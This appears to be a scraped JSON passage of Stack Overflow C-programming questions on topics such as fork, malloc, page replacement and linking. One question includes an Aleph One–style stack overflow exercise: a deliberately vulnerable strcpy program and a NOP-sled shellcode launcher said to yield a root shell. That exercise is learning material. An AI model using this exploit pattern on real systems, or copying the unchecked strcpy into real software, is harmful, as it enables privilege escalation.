MAXARGS 2\n\nstruct pcb {\n    pid_t pid;             // system process ID\n    char *args[MAXARGS];  // program name and args\n    int arrivaltime;\n    int remainingcputime;\n    struct pcb * next;     // links for Pcb handlers\n    int priority, memalloc, res1, res2, res3, res4, status;\n};\ntypedef struct pcb Pcb;\ntypedef Pcb * PcbPtr;\n</code></pre>\n\n<p>the first of which is the name of the program to be executed.</p>\n\n<p>And this is my fork function</p>\n\n<pre><code>PcbPtr startPcb(PcbPtr process) {\n    int pid;\n    switch (pid=fork()) {\n        case -1:\n            return NULL;\n        case 0:\n            execvp(process-&gt;args[0], process-&gt;args);\n        default:\n            return process;\n    }\n    process-&gt;status = 2;\n    return process;\n}\n</code></pre>\n\n<p><em>Note: <code>process-&gt;args[0]</code> is just a const string called \"process\" which refers to a compiled program called 'process' in the current directory.</em><br>\nThere  are no arguments.</p>\n\n<p>When I use gdb and follow the child process its just says:</p>\n\n<pre><code>[New process 15186]\n[Switching to process 15186]\n13                              execvp(process-&gt;args[0], process-&gt;args);\n(gdb)\n\nProgram received signal SIGTSTP, Stopped (user).\nstartPcb (process=0x602250) at util.c:13\n13                              execvp(process-&gt;args[0], process-&gt;args);\n(gdb)\n</code></pre>\n\n<p>Why is it receiving SIGSTP?</p>\n"},{"tags":["c"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":60,"score":-1,"question_id":13219923,"title":"Difficulty using malloc and scanf","body":"<p>I have difficulty using <code>malloc</code> and <code>fscanf</code>.\nI just want to read a file and print out the result using \nI got a segmentation fault error when I executed this code.\nI am not sure what I have done wrong. I would be very grateful if someone points out a fix.\nHere is my code:</p>\n\n<pre><code>#include &lt;stdio.h&gt; \n#include &lt;stdlib.h&gt;\n\nint main(int argc, char* argv[]){\n    char* buffer = (char*)malloc(*argv[1]); // Allocate memory \n    if(buffer=NULL) // if *argv[1] is not existed, exit the program    \n        exit(1);\n\n    int n = 0;\n    FILE* fp=fopen(\"file.txt\",\"r\"); // Open the file\n    do {\n        buffer[n] =fscanf(fp,\"%c\",buffer); // read from file until it gets EOF\n    } while(buffer[n] != EOF);\n    fclose(fp); // Close the file\n\n    printf(\"%s\",buffer); // Print the stored string\n\n    free(buffer); // Return the memory\n    return 0;    \n}\n</code></pre>\n"},{"tags":["c++","c","memory","data-structures"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":104,"score":-1,"question_id":13222324,"title":"Memory management - FIFO, LRU, and OPT page replacement strategies","body":"<p>Okay, i have to write a C/C++ program to simulate these strategies(FIFO, LRU, and OPT page replacement). I want to keep this is simple as possible since i am drowning in homework.</p>\n\n<p>this is what i need to do:</p>\n\n<p>Develop a simulation program to investigate the relative effectiveness of the FIFO, LRU, and OPT page replacement strategies. Your program should measure the number of page faults generated by each strategy. \nYour simulator should read a reference string from a file. The reference string items will be of the form:  , where PID is a process ID and page ref is a page of that process' memory. For example, the following might be the beginning of an input file: </p>\n\n<pre><code>1 45\n1 46\n1 45\n1 44\n1 45\n2 76\n2 75\n2 77\n2 77\n2 76\n</code></pre>\n\n<p>This reference string corresponds to Process 1 accessing its pages 45, 46, 45, 44, and 45, then Process 2 accessing its pages 76, 77, 77, 76, and 75. We will assume a pure demand paging system (no pre-fetching). The simulation also should allow the number of physical frames to be specified. So for example, if there are 3 or more frames available, the above reference string will cause 6 page faults for all three strategies (one for each time a new page is referenced). If there are only 2 frames available, then there would be 7 page faults for LRU and 8 page faults for FIFO</p>\n\n<p>My problem is i am not sure how to tackle this in code. Can i use 2 arrays or in C++ vectors? And how do i know if it page faults? Do i copy one array into another and if a slot is empty thats a page fault? Do i load the file into an array? I want to keep it as simple as possible with no hashtables, or link list since it will take me longer to implement.</p>\n\n<p>I understand theres 3 different strategies. So, i am fine with doing just FIFO for now. I know theres a lot of questions asked but you can see im completely lost. I need some guidance.</p>\n\n<p>Can someone explains the steps i need to take to just implement one of these strategies like FIFO? Keep in mind the program is not as important as understanding it but we need to write the program to understand it.</p>\n"},{"tags":["c","stackoverflow","sudo","shellcode","stack-smash"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":80,"score":2,"question_id":13221414,"title":"Instructions in C buffer being executed only as sudo","body":"<p>I'm working on a buffer overflow attack as described in Aleph One's article <a href=\"http://www.phrack.org/archives/49/p49_0x0e_Smashing%20The%20Stack%20For%20Fun%20And%20Profit_by_Aleph1.txt\" rel=\"nofollow\">Smashing the Stack for Fun and Profit</a>.</p>\n\n<p>As proposed in the article, I've written a program (shellcode.c) that plants the malicious code (shellcode) into an environment variable ($EGG). After which $EGG is passed as an argument to the program (vulnerable.c) that I wish to attack, causing a buffer in that program to overflow and resulting in execution of the shellcode.</p>\n\n<p>This is what the buffer looks like -</p>\n\n<p>[NNNNNNNNN...NNNNNNSSSSSSS...SSSSSSSRRRRR...RRRRRR]</p>\n\n<p>where N is the NOP instruction (see <a href=\"http://en.wikipedia.org/wiki/NOP_slide\" rel=\"nofollow\">NOP sled</a>), S is my shellcode, and R is an address (return address into the buffer that will cause Instruction Pointer to jump from code segment into the above stack buffer and begin executing instructions).</p>\n\n<p><strong>When I run the executables of shellcode.c and vulnerable.c as a normal user, I face the following problem -</strong> When the Instruction Pointer is redirected into the buffer and encounters an instruction, a segmentation fault results. <strong>However, upon executing the programs as sudo</strong>, the instructions in the buffer are executed without any problems and the subsequent shellcode in the buffer is successfully executed, bringing up a root terminal thus completing the exploit. <strong>Can anyone shed light on why this could be happening?</strong></p>\n\n<p>I have disabled the following protections - <em>Stack Smashing Protection</em>, <em>ASLR</em> and <em>Linux's NX</em> (eXecute Disable Bit).</p>\n\n<p>I am compiling using gcc 4.4.3 (Target: i486-linux-gnu) and executing on Ubuntu 10.04 (Lucid Lynx) running kernel 2.6.32.</p>\n\n<p>The following are my two programs:</p>\n\n<p><strong>vulnerable.c</strong></p>\n\n<pre><code>int main(int argc, char** argv) {\nchar buffer[512];\n\nif(argc&gt;1)\n    strcpy(buffer,argv[1]);\n\nreturn (EXIT_SUCCESS);\n}    \n</code></pre>\n\n<p><strong>shellcode.c</strong></p>\n\n<pre><code>int main(int argc,char** argv) {\n\nchar *buff, *ptr;\nint *addr,retaddr;\nint i;\nint offset = DEFAULT_OFFSET;\nint buffersize = DEFAULT_SIZE;\n\n/* Set buffersize and predicted offset if arguments are supplied to the program\n */ \nif(argc&gt;1)\n    buffersize = atoi(argv[1]);\nif(argc&gt;2)\n    offset = atoi(argv[2]);\n\n\nif(!(buff=(char*)malloc(buffersize))) {\n    printf(\"Can't allocate memory!\");\n    exit(1);\n}\n\nretaddr = getStackPointer() - offset;\nprintf(\"%d\\n\",strlen(shellcode));\nprintf(\"Using address: 0x%x\\n\",retaddr);\n\naddr = (int *)buff;\nfor(i=0;i&lt;buffersize;i+=4)\n    *(addr++) = retaddr;\n\nfor(i=0;i&lt;buffersize/2;i++)\n    buff[i] = NOP;\n\nptr = buff + ((buffersize/2) - (strlen(shellcode)/2));\nfor(i=0;i&lt;strlen(shellcode);i++)\n    *(ptr++) = shellcode[i];\n\nbuff[buffersize -1] = '\\0';\n\nmemcpy(buff,\"EGG=\",4);\nputenv(buff);\nsystem(\"/bin/bash\");\n\n return (EXIT_SUCCESS);\n}\n</code></pre>\n"},{"tags":["c","segmentation-fault","ddd-debugger"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":18,"score":1,"question_id":13222566,"title":"error in DDD, trying to find location of SEGFAULT","body":"<p>whenever i try to run ddd ./draw2&amp; to find where my seg fault occurs it doesnt work. i get this error</p>\n\n<p>/home/dsk 13/ugrad/twendlan/C201/Assignment2/drafts/sysdeps/x86_64/strcmp.S: No such file or directory</p>\n\n<p>I don't know how to get by this error, I'm using the same steps i used in the lab 5.</p>\n\n<p>I included -g in my Makefile and I am entering the following command into the prompt...</p>\n\n<p>ddd ./draw2&amp;</p>\n\n<p>then in ddd: program->run (int the arguments box i type ./input.valid.20.random ,which i placed in the same directory) so Why am I getting this error.</p>\n"},{"tags":["c","regex","file-io"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":48,"score":3,"question_id":13221844,"title":"fscanf and newline character","body":"<p>I have fscanf to read lines of setting from a configuration file. Those settings have strictly predefined format which looks like</p>\n\n<pre><code>name1=option1;\nname2=option2;\n...\n</code></pre>\n\n<p>so basically I do</p>\n\n<pre><code>fscanf(configuration,\"%[^=]=%[^;];\",name,option);\n</code></pre>\n\n<p>where configuration is the file stream and name and option are programming buffers.</p>\n\n<p>The problem is that the name buffer contains a newline character I don't want. Is there format specifier I've missed in the \"[^...]\" set to skip newline character? Anyway, can it be solved through format specifier ever?</p>\n\n<p>BTW: Swallowing the newline character by writting this </p>\n\n<pre><code>\"%[^=]=%[^;];\\n\"\n</code></pre>\n\n<p>is not elegent I think for that the newline character could repeat more than once anywhere.</p>\n"},{"tags":["c","arrays"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":81,"score":2,"question_id":13221373,"title":"Int array to store large numbers (over 20 digits)","body":"<p>I have an assignment that requires me to first set up integer arrays to store arbitrarily large numbers. By using each element of an int array, I can hold one digit per element because int variable types are 32 bits and can only reach up to about 2 billion before failing. I know that there are other libraries using BigInt but I wanted to make my own arrays instead.</p>\n\n<p>I tested my code out, but it doesn't seem to be accepting values past 9 digits until it starts to fail. </p>\n\n<pre><code>int * toArray(int, int);\nint main()\n{\n    int n, *res, counter, i;\n    printf(\"Input: \");\n    scanf(\"%d\", &amp;n);\n    while(n&gt;0){\n         n/=10;\n         counter++;\n    }\n    res = toArray(n, counter);\n    for(i=1;i&lt;=counter;i++){\n         printf(\"%d\", *(res)+i);\n    }\n    printf(\"\\n\");\n}   \n\nint * toArray(int n, int counter)\n{\n    int i;\n    int *numberArray = malloc(sizeof(int) * counter);\n    for(i=0; i&lt; counter; i++)\n    {   \n         numberArray[i] = n % 10;\n    }\n    return numberArray;\n}\n</code></pre>\n\n<p>I want to be able to accept close to twenty digits at the very least. I know this can be done with int arrays, although char arrays (or strings) are also a possibility. But I wanted to use int arrays instead. Any help in understanding why it fails around 9 digits and suggestions for going past that would be very much appreciated. Thank you.</p>\n"},{"tags":["c","osx","dtrace"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":20,"score":1,"question_id":13222305,"title":"Example of using dtrace to calculate average and max disk read/write queue over time","body":"<p>I need to read disk queue length (separately for read and write operations) on Mac OSX. I already came to conclusion that this may be done only via dtrace (I would be happy to be wrong here, however I did not find any way of doing this differently). The only way which provided this information is iopending dtrace script. I need to be able to access the information it provides (or rather be able to implement its logic) in my C program. Usage of libdtrace is very cryptic (considering private API), as the overall dtrace business. Is there any example (besides a few I have found which don't answer my question - <a href=\"http://stackoverflow.com/questions/3792486/libdtrace-buffered-output\">libdtrace buffered output</a> and <a href=\"http://www.osdevcon.org/2008/files/osdevcon2008-petr.pdf\" rel=\"nofollow\">http://www.osdevcon.org/2008/files/osdevcon2008-petr.pdf</a>) which can help me?</p>\n"},{"tags":["c","macros","define"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":13221523,"title":"Using a macro to construct a function","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/2191316/macro-for-concatenating-two-strings-in-c\">Macro for concatenating two strings in C</a>  </p>\n</blockquote>\n\n\n\n<p>I have a function that looks something like this:</p>\n\n<pre><code>bool module_foo_process(void* bar) { return doMagic(bar); }\n</code></pre>\n\n<p>Now, I'd like to generate it with a macro.  For instance, the macro for the above function would look like this:</p>\n\n<pre><code>MY_AMAZING_MACRO(foo)\n</code></pre>\n\n<p>This allows me to write something like:</p>\n\n<pre><code>MY_AMAZING_MACRO(awesome)\n</code></pre>\n\n<p>and get this:</p>\n\n<pre><code>bool module_awesome_process(void* bar) { return doMagic(bar); }\n</code></pre>\n\n<p>Any ideas on how this can be accomplished in C?</p>\n"},{"tags":["c","memory-management","malloc","free"],"answer_count":3,"favorite_count":5,"up_vote_count":7,"down_vote_count":0,"view_count":3711,"score":7,"question_id":5422061,"title":"malloc implementation?","body":"<p>I'm trying to implement <code>malloc</code> and <code>free</code> for C, and I am not sure how to reuse memory. I currently have a <code>struct</code> that looks like this:</p>\n\n<pre><code>typedef struct _mem_dictionary {\n  void *addr;\n  size_t size;\n    int freed;\n} mem_dictionary;\n</code></pre>\n\n<p>My <code>malloc</code> looks like this:</p>\n\n<pre><code>void *malloc(size_t size) {\n    void *return_ptr = sbrk(size);\n    if (dictionary == NULL) dictionary = sbrk(1024 * sizeof(mem_dictionary));\n\n    dictionary[dictionary_ct].addr = return_ptr;\n    dictionary[dictionary_ct].size = size;\n    dictionary[dictionary_ct].freed = 1;\n    dictionary_ct++;\n\n    return return_ptr;\n}\n</code></pre>\n\n<p>When I free memory, I would just mark the address as 0 (that would indicate that it is free). In my <code>malloc</code>, I would then use a for loop to look for any value in the array to equal 0 and then allocate memory to that address. I'm kind of confused how to implement this.</p>\n"},{"tags":[".net","c","webkit","webbrowser","chromium"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":4,"view_count":27,"score":-2,"question_id":13221687,"title":"Chromium webbrowser","body":"<p>I want to make a really advanced browser even with page source wiewer. </p>\n\n<p>I did everything in code but i don't think that ie engine is good for me. So i want to use chromium or webkit. I prefer chromium. </p>\n\n<p>I saw hot to make a chrome browser in developer site and how to make a safari in webkit site but i want smt. diffrent. </p>\n\n<p>Can anyone give me some example codes or tell me how to replace it with ie? I'm waiting your answers. </p>\n\n<p>[Note: It should be .net, c++ or C#)</p>\n"},{"tags":["mysql","c","shared-libraries","static-libraries","ld"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":13221838,"title":"ld cannot find libmysqlclient","body":"<p>I remember, years ago when I started using mySQL, it was a nightmare to set up things \"just so,\" so that the libraries were found (especially mySQL libraries!).  In my case, I believe ldconfig was the tool that sorted things out.  Flash forward to 2012 - have just installed a new \"primary\" system that includes 64-bit Ubuntu 12.04, and I'm in the process of making sure all my sources will compile.  Imagine my surprise that I'm back in the same boat with libmysqlclient.</p>\n\n<p>My web searches have revealed much to try, nothing that helps.  Along the way, I found this trick:  gcc ...  <code>mysql_config --cflags --libs</code> - very nice, but that didn't help.</p>\n\n<p>So, for example, the result of:</p>\n\n<pre><code>gcc -D_FILE_OFFSET_BITS=64 `mysql_config --cflags --libs` \\\n            -o check-my-ip \\\n            -s check-my-ip.c ../common/ini-file.c\n</code></pre>\n\n<p>is</p>\n\n<pre><code> /tmp/ccxAgCqr.o: In function `updateTables':\n /usr/local/src/check-my-ip/check-my-ip.c:373: undefined reference to `mysql_init'\n /usr/local/src/check-my-ip/check-my-ip.c:374: undefined reference to `mysql_real_connect'\n /usr/local/src/check-my-ip/check-my-ip.c:381: undefined reference to `mysql_error'\n /usr/local/src/check-my-ip/check-my-ip.c:381: undefined reference to `mysql_errno'\n /usr/local/src/check-my-ip/check-my-ip.c:397: undefined reference to `mysql_field_count'\n /usr/local/src/check-my-ip/check-my-ip.c:398: undefined reference to `mysql_use_result'\n /usr/local/src/check-my-ip/check-my-ip.c:399: undefined reference to `mysql_fetch_row'\n /usr/local/src/check-my-ip/check-my-ip.c:419: undefined reference to `mysql_free_result'\n /usr/local/src/check-my-ip/check-my-ip.c:422: undefined reference to `mysql_field_count'\n /usr/local/src/check-my-ip/check-my-ip.c:429: undefined reference to `mysql_close'\n /tmp/ccxAgCqr.o: In function `myQuery':\n /usr/local/src/check-my-ip/check-my-ip.c:439: undefined reference to `mysql_query'\n /usr/local/src/check-my-ip/check-my-ip.c:441: undefined reference to `mysql_error'\n /tmp/ccxAgCqr.o: In function `indexExists':\n /usr/local/src/check-my-ip/check-my-ip.c:464: undefined reference to `mysql_field_count'\n /usr/local/src/check-my-ip/check-my-ip.c:465: undefined reference to `mysql_use_result'\n /usr/local/src/check-my-ip/check-my-ip.c:466: undefined reference to `mysql_fetch_row'\n /usr/local/src/check-my-ip/check-my-ip.c:471: undefined reference to `mysql_free_result'\n collect2: ld returned 1 exit status\n make: *** [check-my-ip] Error 1\n</code></pre>\n\n<p>Output from  mysql_config --cflags --libs is:</p>\n\n<pre><code>-I/usr/include/mysql -DBIG_JOINS=1  -fno-strict-aliasing  -g\n-L/usr/lib/x86_64-linux-gnu -lmysqlclient -lpthread -lz -lm -lrt -ldl\n</code></pre>\n\n<p>These are some other commands that may be helpful in diagnosis:</p>\n\n<p>$ ldconfig -p | grep mysql</p>\n\n<pre><code>    libmysqlclient.so.18 (libc6,x86-64) =&gt; /usr/lib/x86_64-linux-gnu/libmysqlclient.so.18\n    libmysqlclient.so (libc6,x86-64) =&gt; /usr/lib/x86_64-linux-gnu/libmysqlclient.so\n\n $ ls -l /usr/lib/x86_64-linux-gnu/libmysqlclient.so.18\n lrwxrwxrwx 1 root root 24 Jun 11 10:21 /usr/lib/x86_64-linux-gnu/libmysqlclient.so.18 -&gt; libmysqlclient.so.18.0.0\n $ ls -l /usr/lib/x86_64-linux-gnu/libmysqlclient.so.18.0.0\n -rw-r--r-- 1 root root 3408136 Jun 11 10:21 /usr/lib/x86_64-linux-gnu/libmysqlclient.so.18.0.0\n</code></pre>\n\n<p>I did an <code>aptitude search libmysql</code> and noted that there are 37 lines, most of which have the i386 designation (like: libmysqld-pic:i386),\nand I notice that there are zero lines with x86_64 (or -64) in that output; is that part of the problem?  (Here are those 37 lines)</p>\n\n<pre><code> $ aptitude search libmysql\n p   libmysql++-dev                            - MySQL C++ library bindings (development)\n p   libmysql++-dev:i386                       - MySQL C++ library bindings (development)\n p   libmysql++-doc                            - MySQL C++ library bindings (documentation and exampl\n p   libmysql++3                               - MySQL C++ library bindings (runtime)\n p   libmysql++3:i386                          - MySQL C++ library bindings (runtime)\n p   libmysql-cil-dev                          - MySQL database connector for CLI\n p   libmysql-diff-perl                        - module for comparing the table structure of two MySQ\n p   libmysql-java                             - Java database (JDBC) driver for MySQL\n p   libmysql-ocaml                            - OCaml bindings for MySql\n p   libmysql-ocaml:i386                       - OCaml bindings for MySql\n p   libmysql-ocaml-dev                        - OCaml bindings for MySql\n p   libmysql-ocaml-dev:i386                   - OCaml bindings for MySql\n v   libmysql-ocaml-dev-dnim6:i386             -\n v   libmysql-ocaml-dev-jygp6                  -\n v   libmysql-ocaml-dnim6:i386                 -\n v   libmysql-ocaml-jygp6                      -\n p   libmysql-ruby                             - Transitional package for ruby-mysql\n v   libmysql-ruby:i386                        -\n p   libmysql-ruby1.8                          - Transitional package for ruby-mysql\n v   libmysql-ruby1.8:i386                     -\n p   libmysql-ruby1.9.1                        - Transitional package for ruby-mysql\n v   libmysql-ruby1.9.1:i386                   -\n p   libmysql6.4-cil                           - MySQL database connector for CLI\n i   libmysqlclient-dev                        - MySQL database development files\n p   libmysqlclient-dev:i386                   - MySQL database development files\n v   libmysqlclient15-dev                      -\n v   libmysqlclient15-dev:i386                 -\n i A libmysqlclient18                          - MySQL database client library\n p   libmysqlclient18:i386                     - MySQL database client library\n p   libmysqlcppconn-dev                       - MySQL Connector for C++ (development files)\n p   libmysqlcppconn-dev:i386                  - MySQL Connector for C++ (development files)\n p   libmysqlcppconn5                          - MySQL Connector for C++ (library)\n p   libmysqlcppconn5:i386                     - MySQL Connector for C++ (library)\n i   libmysqld-dev                             - MySQL embedded database development files\n p   libmysqld-dev:i386                        - MySQL embedded database development files\n p   libmysqld-pic                             - MySQL database development files\n p   libmysqld-pic:i386                        - MySQL database development files\n</code></pre>\n\n<p>Here's the content of /usr/lib/mysql</p>\n\n<pre><code>$ find /usr/lib/mysql\n/usr/lib/mysql\n/usr/lib/mysql/plugin\n/usr/lib/mysql/plugin/qa_auth_client.so\n/usr/lib/mysql/plugin/auth.so\n/usr/lib/mysql/plugin/qa_auth_server.so\n/usr/lib/mysql/plugin/semisync_master.so\n/usr/lib/mysql/plugin/libdaemon_example.so\n/usr/lib/mysql/plugin/ha_example.so\n/usr/lib/mysql/plugin/adt_null.so\n/usr/lib/mysql/plugin/auth_test_plugin.so\n/usr/lib/mysql/plugin/auth_socket.so\n/usr/lib/mysql/plugin/qa_auth_interface.so\n/usr/lib/mysql/plugin/semisync_slave.so\n/usr/lib/mysql/plugin/mypluglib.so\n</code></pre>\n\n<p>I don't know what else to try, where else to look, and would appreciate any pointers.</p>\n"},{"tags":["c++","c","image","ascii"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":51,"score":-4,"question_id":13221731,"title":"c++ - Library to convert images to ASCII art","body":"<p>I'm looking for a C or C++ library that can convert *.jpg file to ASCII art. </p>\n"},{"tags":["c","matrix","parallel-processing","openmp"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":56,"score":2,"question_id":13217492,"title":"How to make parallel this for in OpenMP","body":"<p>I know the basics of OpenMP and I know that in order to parallelize a for its iterations must not depend on previous iterations. Also one can use reductions, but they support only basic operators such as +, -,/, *, &amp;&amp;, ||.</p>\n\n<p>How I can make this for parallel?</p>\n\n<pre><code>for (i = 1; i &lt; n; ++i) {\n    for (j = 1; j &lt; n; ++j) {\n        // stanga\n        if (res[i][j - 1] != res[i][j]) {\n            cmin2[i][j][0] = min(cmin2_res[i][j - 1][0] + 1, cmin[i][j][0]);\n            cmin2_res[i][j][0] = min(cmin2[i][j - 1][0] + 1, cmin_res[i][j][0]);\n         } else {\n            cmin2[i][j][0] = min(cmin2[i][j - 1][0] + 1, cmin[i][j][0]);\n            cmin2_res[i][j][0] = min(cmin2_res[i][j - 1][0] + 1, cmin_res[i][j][0]);\n         }\n         // sus\n         if (res[i - 1][j] != res[i][j]) {\n             cmin2[i][j][0] = min3(cmin2[i][j][0], cmin2_res[i - 1][j][0] + 1, cmin[i][j][1]);\n             cmin2_res[i][j][0] = min3(cmin2_res[i][j][0], cmin2[i - 1][j][0] + 1, cmin_res[i][j][1]);\n         } else {\n             cmin2[i][j][0] = min3(cmin2[i][j][0], cmin2[i - 1][j][0] + 1, cmin[i][j][1]);\n             cmin2_res[i][j][0] = min3(cmin2_res[i][j][0], cmin2_res[i - 1][j][0] + 1, cmin_res[i][j][1]);\n         }\n     }\n }\n</code></pre>\n\n<p>My question is rather how I can decompose this for to be able to run it in parallel (and maybe use reductions if possible).</p>\n\n<p>The problem is that at each iteration the operations must be done in this order, because I have 3 more groups of for like this. </p>\n\n<p>P.S. min and min3 are macros.</p>\n"},{"tags":["c","string"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":1,"view_count":71,"score":3,"question_id":13221251,"title":"Why don't i get \"Segmentation Fault\"?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12410016/why-dont-i-get-a-segmentation-fault-when-i-write-beyond-the-end-of-an-array\">Why don’t I get a segmentation fault when I write beyond the end of an array?</a>  </p>\n</blockquote>\n\n\n\n<p>This code compiles and runs without any error. But how?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main (void)\n{\n    int foo[2];\n\n    foo[8] = 4; /* How could this happen? */\n\n    printf(\"%d\\n\", foo[8]);\n\n    return 0;\n}\n</code></pre>\n\n<p>I'm compiling with <strong>GCC 4.7.2</strong> on Arch Linux x86_64.</p>\n\n<pre><code>gcc -Wall -o \"main\" \"main.c\"\n</code></pre>\n"},{"tags":["c"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":13221106,"title":"read file of 10 lines of integer, put them in a array, and output the array","body":"<ol>\n<li><p>In this program, i want to let user to input 2 arguments, the number \n      of integer,and the file name. </p>\n\n<ol>\n<li>the file has 10 lines of integer value. </li>\n<li>read the file, and put it to inArray[];</li>\n<li><p>and then output it as the end;</p>\n\n<p>notes: For the complete program, i want to make a program that \n      will scan a file consists of random integer,and then sort \n      them in ascend order, and print out the first 10 percent\n       of the sorted integer. </p>\n\n<p>Error: For now, i want to test if it can read the file and put values\n      into the inArray properly, but its keep getting errors. </p>\n\n<pre><code>  warning: initialization makes integer from pointer without a cast\n   findTotal.c:43:6: warning: passing argument 1 of ‘fopen’\n               makes pointer from integer without a cast\n  /usr/include/stdio.h:271:14: note: expected ‘const \n   char * __restrict__’ but argument is of type ‘char’\n</code></pre></li>\n</ol></li>\n</ol>\n\n<p>Please help me with this, thank you</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n\n\nint main(int argc, char *argv[]){\n\n int numOfInt;\n char fileName=\"\";\n\n sscanf(argv[1],\"%d\",&amp;numOfInt);\n sscanf(argv[2],\"%c\",&amp;fileName);\n\n int i, rc;\n\n /* the origninal list , initialise as 0 index*/\n int inArray[numOfInt];\n\n /* the number of output int  */\n int outNumInt = numOfInt * 0.1;\n\n /*  the output array of int  */\n int outArray[outNumInt];\n\n\n FILE *inFile;\n inFile = fopen(fileName,\"r\");\n\n /*      check if the file is empty      */\n if(inFile==NULL){\n    printf(\"can not open the file\");\n }\n\n for (i = 0; (rc = getc(inFile)) != EOF &amp;&amp; i &lt; numOfInt; inArray[i++] = rc) \n { \n\n\n }//for\n\n fclose(inFile);\n\n for(i = 0; i &lt; numOfInt;i++){\n\n    printf(\"%x\\n\",inArray[i]);\n }\n\n\n\n}//main\n</code></pre>\n"},{"tags":["c++","c"],"answer_count":7,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":91,"score":-1,"question_id":13220824,"title":"If int *a = *b, will a point to the object that b references?","body":"<p>Or will the address a be equal to the integer that b references?</p>\n\n<p>Or will something else happen?</p>\n\n<p>Edit: Also, if double *a = 3.0, does a point to 3.0?</p>\n"},{"tags":["c++","c","pointers","char","char-pointer"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":59,"score":0,"question_id":13220512,"title":"C++ error: cannot convert ‘char (*)[63]’ to ‘char*’ in initialization","body":"<p>I seem to be more of a noob in C++ than I originally thought. As far as my knowledge of C/C++ goes, this should work. I define a character array then try to assign a pointer to the beginning... What am I doing wrong?</p>\n\n<pre><code>// Create character array\nchar str[] = \"t xtd 02 1CF00400 08 11 22 33 44 55 66 77 88 0   0 1234.567890\";\n// Assign pointer to beginning of array\nchar* p = &amp;str;\n</code></pre>\n"},{"tags":["c","string","pointers","char"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":13220439,"title":"swapping string in c using pointer","body":"<p>Need help</p>\n\n<p>this is my code</p>\n\n<pre><code>void swapstringfun()\n{\nint i=0,j=0;\nchar *str=(char *)malloc(sizeof(char)*15);\nchar *mystr=(char *)malloc(sizeof(char)*15);\nsystem(\"cls\");\nprintf(\"Please enter first string :\\t\");\nscanf(\"%s\",str);\nprintf(\"Please enter second string :\\t\");\nscanf(\"%s\",mystr);\nwhile(*(str+i)!='\\0' &amp;&amp; *(mystr+i)!='\\0')\n{\n*(str+i) ^=*(mystr+i);\n*(mystr+i) ^=*(str+i);\n*(str+i) ^=*(mystr+i);\ni++;\n}\nprintf(\"%s swapped to %s\",str,mystr);\ngetch();\nmain();\n}\n</code></pre>\n\n<p>I wrote the above code to swap the string using XOR operator. The problem with this code is. when my input is lets say.. <strong>RAJESH</strong> and <strong>ASHISH</strong>. Then, it shows output <strong>ASHISH</strong> and <strong>RAJESH</strong>. And, that is expected. </p>\n\n<p>But, when input is let say.. <strong>ABHISHEK</strong> and <strong>CODER</strong> .Then, output is <strong>CODERHEK</strong> and <strong>ABHIS</strong>. But, the expected output is <strong>CODER</strong> and <strong>ABHISHEK</strong>. Anyone help me to solve this problem. I will appreciate.</p>\n"},{"tags":["c","gdb"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13220216,"title":"How to go at particular value of counter in for loop using gdb?","body":"<p>I have a for loop of about 100 odd values. I want to have a breakpoint where I can set some value for the iterator variable and then directly go on that program execution state.</p>\n\n<p>For example</p>\n\n<pre><code>for(int i=0;i&lt;500;i++)\n{ \n  doSomething();\n}\n</code></pre>\n\n<p>Here I want to have a breakpoint on <code>i=100;</code> and step through all values from 0 to 99 in one go. Is this possible in <code>gdb</code> and how do I do it?</p>\n"},{"tags":["c","eclipse","scanf"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":13220217,"title":"about C and eclipse - scanf","body":"<p>When I try to use <code>scanf</code></p>\n\n<pre><code>int main() {\n\n    int x1,x2,x3,y1,y2,y3;\n\n    printf(\"Enter 3 pairs of positive integers separated by spaces:\\n\");\n\n    scanf(\"%u %u %u %u %u %u\", &amp;x1, &amp;y1, &amp;x2, &amp;y2, &amp;x3, &amp;y3);\n</code></pre>\n\n<p>I get the program running, like for an input.\nThen I put the input, but it prints the \"enter 3 pairs...\" and does nothing</p>\n\n<p>why is that?</p>\n"},{"tags":["c++","c","io","filechannel"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":13220132,"title":"File Channel in C++","body":"<p>In java, there are <a href=\"http://docs.oracle.com/javase/7/docs/api/java/nio/channels/FileChannel.html\" rel=\"nofollow\">FileChannel</a>s where I can read from file channel. I can also set the position in the channel where I want to start reading.</p>\n\n<p>Any similar functions in C++/C?</p>\n"},{"tags":["c++","c","math"],"answer_count":13,"favorite_count":19,"up_vote_count":60,"down_vote_count":0,"view_count":38478,"score":60,"question_id":1903954,"title":"Is there a standard sign function (signum, sgn) in C/C++?","body":"<p>I want a function that returns -1 for negative 